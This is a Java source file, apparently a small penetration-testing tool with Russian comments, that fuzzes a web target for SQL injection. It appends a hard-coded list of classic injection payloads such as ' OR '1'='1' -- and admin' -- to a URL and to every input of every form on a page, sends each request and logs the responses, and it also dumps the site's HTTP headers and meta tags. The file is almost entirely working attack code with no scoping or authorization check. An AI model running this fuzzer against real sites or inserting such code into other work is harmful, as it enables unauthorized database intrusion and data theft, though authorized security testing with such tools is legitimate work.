package org.example;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.io.IOException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class SQLInjectionFuzzer {

    // Список типичных SQL-инъекционных строк
    private static final List<String> SQL_INJECTIONS = Arrays.asList(
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' ({",
            "' OR '1'='1' /*",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' OR 1=1 --",
            "' OR 1=1 #",
            "' OR 1=1/*",
            "' OR 'a'='a",
            "') OR ('a'='a",
            "') OR ('a'='a' --",
            "' ) OR ('a'='a' /*",
            "1234' OR '1'='1",
            "1234' OR '1'='1' --",
            "1234' OR '1'='1' /*"
    );

    public static String fuzzSQLInjection(String url) {
        StringBuilder results = new StringBuilder();

        for (String injection : SQL_INJECTIONS) {
            String fuzzedUrl = url + injection;
            try {
                String response = sendGetRequest(fuzzedUrl);
                results.append("URL: ").append(fuzzedUrl).append("\n");
                results.append("Ответ: ").append(response).append("\n\n");
            } catch (IOException e) {
                results.append("URL: ").append(fuzzedUrl).append("\n");
                results.append("Ошибка: ").append(e.getMessage()).append("\n\n");
            }
        }

        return results.toString();
    }

    public static String fuzzSQLInjectionForms(String url) {
        StringBuilder results = new StringBuilder();
        try {
            Document doc = Jsoup.connect(url).get();
            Elements forms = doc.select("form");

            for (Element form : forms) {
                Elements inputs = form.select("input");
                for (Element input : inputs) {
                    String name = input.attr("name");
                    for (String injection : SQL_INJECTIONS) {
                        Map<String, String> formData = new HashMap<>();
                        formData.put(name, injection);
                        String action = form.attr("action");
                        String formMethod = form.attr("method").toUpperCase();
                        try {
                            String formResponse = sendForm(url, action, formMethod, formData);
                            results.append("Форма: ").append(action).append("\n");
                            results.append("Инъекция: ").append(injection).append("\n");
                            results.append("Ответ: ").append(formResponse).append("\n\n");
                        } catch (IOException e) {
                            results.append("Форма: ").append(action).append("\n");
                            results.append("Инъекция: ").append(injection).append("\n");
                            results.append("Ошибка: ").append(e.getMessage()).append("\n\n");
                        }
                    }
                }
            }
        } catch (IOException e) {
            results.append("Ошибка при загрузке формы: ").append(e.getMessage()).append("\n");
        }

        return results.toString();
    }

    public static String getResourceInfo(String url) {
        StringBuilder resourceInfo = new StringBuilder();

        try {
            Connection.Response response = Jsoup.connect(url).execute();
            Document doc = response.parse();

            // Получение заголовков HTTP-ответа
            resourceInfo.append("HTTP Заголовки:\n");
            response.headers().forEach((key, value) -> resourceInfo.append(key).append(": ").append(value).append("\n"));

            // Получение информации о содержимом страницы
            resourceInfo.append("\nИнформация о содержимом страницы:\n");
            String title = doc.title();
            resourceInfo.append("Заголовок страницы: ").append(title).append("\n");

            Elements metaTags = doc.select("meta");
            for (Element metaTag : metaTags) {
                String name = metaTag.attr("name");
                String content = metaTag.attr("content");
                if (!name.isEmpty()) {
                    resourceInfo.append("Meta Tag - ").append(name).append(": ").append(content).append("\n");
                }
            }

            Elements headers = doc.select("h1, h2, h3, h4, h5, h6");
            for (Element header : headers) {
                resourceInfo.append(header.tagName()).append(": ").append(header.text()).append("\n");
            }

        } catch (IOException e) {
            resourceInfo.append("Ошибка при получении информации о ресурсе: ").append(e.getMessage()).append("\n");
        }

        return resourceInfo.toString();
    }

    private static String sendGetRequest(String url) throws IOException {
        Connection.Response response = Jsoup.connect(url).method(Connection.Method.GET).execute();
        return response.body();
    }

    private static String sendForm(String baseUrl, String action, String method, Map<String, String> formData) throws IOException {
        Connection connection;
        if (method.equals("POST")) {
            connection = Jsoup.connect(baseUrl + action).method(Connection.Method.POST);
        } else {
            connection = Jsoup.connect(baseUrl + action).method(Connection.Method.GET);
        }
        connection.data(formData);
        Connection.Response response = connection.execute();
        return response.body();
    }
}
